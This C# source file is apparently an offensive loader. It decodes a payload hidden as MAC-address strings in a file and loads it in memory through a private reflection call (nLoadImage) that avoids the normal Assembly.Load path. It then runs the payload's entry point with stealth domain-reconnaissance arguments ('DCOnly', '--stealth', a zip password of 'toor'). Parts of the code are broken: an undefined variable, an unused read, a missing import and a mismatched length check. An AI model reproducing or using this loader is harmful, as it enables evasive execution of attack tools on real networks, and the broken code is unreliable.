using System;
using System.Runtime.InteropServices;
using System.Reflection;
using System.IO;
using System.Threading;
using System.Security;
using System.Linq;

namespace Run
{
	
	public class Run
	{
		[STAThread]
		public static void Main(string[] args)
		{
			/*
			var adm = typeof(System.AppDomain).Assembly.GetType("System.AppDomain");
			AppDomain root = AppDomain.CurrentDomain;
			FieldInfo fi = adm.GetField("_domainManager",BindingFlags.NonPublic | BindingFlags.Instance);
			AppDomainManager a = (AppDomainManager)fi.GetValue(root);
			Console.WriteLine("ADM: " + a);
			*/
			string aaa = File.ReadAllText(args[0]);
			byte[] ab = MacAddressScan(lines);
			var scm = typeof(System.Threading.Thread).Assembly.GetType("System.Threading.StackCrawlMark");
			object val = Enum.ToObject(scm, 1);
			var ktt = typeof(System.Reflection.Assembly).Assembly.GetType("System.Reflection.RuntimeAssembly");
			var hf = ktt.GetMethod("nLoadImage", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);
		
			var assem = (Assembly) hf.Invoke(null, new object[] { ab, null, null, val, false, false, SecurityContextSource.CurrentAssembly });
			
			//Assembly assem = Assembly.Load(a);
			MethodInfo mi = assem.EntryPoint;
			string[] p = new string[] {"-c", "DCOnly", "--stealth", "--zippassword","toor"};	
			mi.Invoke(null,new object[] { p });
			
			
		
		}
		private static byte[] MacAddressScan(string[] mcaddrArray)
        {
            List<byte> mcaddr = new List<byte>();
            for (int i = 0; i < mcaddrArray.Length; i++)
            {
                string[] parts = mcaddrArray[i].Split('-');
                if (parts.Length == 10)
                {
                    for (int j = 0; j < parts.Length; j++)
                    {
                        if (!parts[j].Contains("ABC") && !parts[j].Contains("DEF") && !parts[j].Contains("GHI") &&
                            !parts[j].Contains("JKL") && !parts[j].Contains("MNO") && !parts[j].Contains("PQR"))
                        {
                            mcaddr.Add(Convert.ToByte(parts[j], 16));
                        }
                    }
                }
                
            }
            return mcaddr.ToArray();
        }      
		
	}
}
